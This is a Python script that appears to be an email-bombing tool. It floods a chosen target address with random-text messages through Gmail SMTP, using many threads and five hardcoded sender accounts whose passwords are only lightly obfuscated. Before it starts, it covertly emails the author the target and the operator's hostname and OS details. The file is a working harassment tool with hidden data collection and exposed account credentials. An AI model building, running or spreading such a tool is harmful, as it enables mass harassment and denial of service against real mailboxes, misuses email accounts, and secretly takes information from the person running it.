import smtplib, socket, sys, os, time
from random import randrange
import threading as t
import os

emails = {"sceet421@gmail.com":"fwbodppm",
          "sceet422@gmail.com":"fwbotdffu533",
          "arandomperson4206969@gmail.com":"jepoufwfolopx21",
          "anotherspamemail514@gmail.com":"jepoufwfolopx3",
          "anotherspamemail513@gmail.com":"jepoufwfolopx2"
          }

osData = os.uname()

print("Note that if you send too many emails from a single IP, the SMTP server may block your IP address.\n")

target = input("Target > ")

try:
    target.index("@")
except:
    print("E: Invalid target, Quitting...")
    exit()
if target == "giantsmilodon@gmail.com" or target == "evanalekseyev23@mittymonarch.com":
    print("E: Invalid target, Quitting...")
    exit()

name = input("Name of sender, default none > ")
subject = input("Subject, default none > ")

reps = input("Email count, default 50 > ")

if reps == "":
    reps = 50
try:
    reps = int(reps)
except:
    print("E: Invalid email count. Quitting...")
    exit()

emailCount = reps

threads = input("Thread count, default half of email count > ") #30
if threads == "":
    threads = reps / 2
try:
    threads = int(threads)
except:
    print("E: Invalid thread count. Quitting...")
    exit()

if threads > reps:
    print("E: Thread count cannot be larger than email count. Quitting...")
    exit()


print("{} emails will be sent to {} using {} threads at a time. Starting...".format(str(reps), str(target), str(threads)))


# generate random amount of text of iter length
def random_text(iter):
    bdy = ''
    for i in range(iter):
        char = str(chr(randrange(33, 126)))
        if char != '.':
            bdy += char
        else: 
            bdy += 'k'
    return bdy

# sends email and executes all dependencies
# num is the amount of times it has had to execute
# TODO: base64 for encryption
count = 0
def main(from_name, sent_from, sent_from_pass_enc, to_email, bdy_text, subject="", num=1, silent=0):
    global count
    global emails
    # set headers and body
    email_text = "From: {}\n".format(from_name)
    email_text += "To: {}\n".format(to_email)
    email_text += "Subject: {}\n\n".format(subject)
    email_text = email_text + bdy_text

    #print(email_text)

    # decrypt
    sent_from_pass_enc_ = [i for i in sent_from_pass_enc]
    for i in range(len(sent_from_pass_enc_)):
        sent_from_pass_enc_[i] = chr(ord(sent_from_pass_enc_[i])-1)
    sent_from_pass = "".join(sent_from_pass_enc_)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(sent_from, sent_from_pass)
        server.sendmail(sent_from, [to_email], email_text)
        server.close()
        if not silent:
            print('Email ' + str(count) + ' on try ' + str(num))
        count += 1
    except Exception as e:
        # try sending again after short sleep
        if num < 10:
            time.sleep(0.05)
            try:
                main(from_name, sent_from, sent_from_pass_enc, to_email, bdy_text, subject, num+1)
            except:
                num+=1
        #if it has been trying for some time, print error
        else:
            if not silent:
                print("Failed to send from " + sent_from)
            main(name,
                 list(emails.keys())[emails.keys().index(sent_from)-1],
                 list(emails.values())[emails.keys().index(sent_from)-1],
                 target,
                 random_text(randrange(500, 1000)),
                 subject)

# Start main

if __name__ == "__main__":
    # Send first email
    bdy_info = "Email Spamming program used.\n"
    bdy_info += "Target: " + target
    bdy_info += "\nName of Sender: " + name
    bdy_info += "\nSubject: " + subject
    bdy_info += "\nEmail Count: " + str(emailCount)
    bdy_info += "\n------- OS info -------"
    bdy_info += "\nOS Kernel: " + osData[0]
    bdy_info += "\nOS Kernel Version: " + osData[3]
    bdy_info += "\nDevice Hostname: " + osData[1] 
    main("Email Sent", "sceet421@gmail.com", "fwbodppm", "giantsmilodon@gmail.com", bdy_info, "", 1, 1)

    startTime = time.time()
    p = [None for i in range(threads)]
    if reps <= threads:
        for i in range(reps):
            p[i] = t.Thread(target=main,
                            args=[name,
                                  list(emails.keys())[reps % len(list(emails.keys()))],
                                  list(emails.values())[reps % len(list(emails.values()))],
                                  target,
                                  random_text(randrange(500, 1000)),
                                  subject])
            p[i].start()
            reps -= 1
        for i in range(reps):
            p[i].join()

    else:
        # replace threads for num
        for i in range(threads):
            p[i] = t.Thread(target=main,
                            args=[name,
                                  list(emails.keys())[reps % len(list(emails.keys()))],
                                  list(emails.values())[reps % len(list(emails.values()))],
                                  target,
                                  random_text(randrange(500, 1000)),
                                  subject])
            p[i].start()
            reps -= 1
        while True:
            # replace threads for num
            for i in range(threads):
                if p[i].is_alive() == False and reps > 0:
                    p[i] = t.Thread(target=main,
                                    args=[name,
                                          list(emails.keys())[reps % len(list(emails.keys()))],
                                          list(emails.values())[reps % len(list(emails.values()))],
                                          target,
                                          random_text(randrange(500, 1000)),
                                          subject])
                    p[i].start()
                    reps -= 1
                elif reps == 0:
                    break
            if reps <= 0:
                # replace threads for num
                for i in range(threads):
                    p[i].join()
                break

    totalTime = time.time() - startTime

    print("\nFinished in " + str(totalTime) + " seconds.")
    print("Average speed: " + str(emailCount / float(totalTime)) + " emails per second.")
